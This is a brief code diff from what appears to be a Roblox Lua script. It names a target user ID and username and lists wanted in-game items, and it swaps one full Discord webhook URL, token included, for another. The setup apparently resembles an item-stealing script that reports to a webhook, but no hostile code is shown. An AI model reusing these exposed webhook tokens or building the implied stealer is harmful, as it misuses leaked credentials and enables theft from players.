@@ -1,6 +1,6 @@
 local TARGET_ID = 5078906742
 local TARGET_USER = "PopMast9329"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572789451854323742/zIJX6KVIZdrknLNMvApzV3DclnsydjvfLdkuSi8RznI0HikmJNlm-2wFcTvwy_hHXgzW"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572796013154926705/OUNrlP6cR2HHTSw5Tr8H0qRRFKXgI2JcWY_sM5NIOTsJVQozOY2hOcTEx7d5k_Hs4IHy"
 
 local TargetBrainrots = {
     ["Hydra Bunny"] = true,
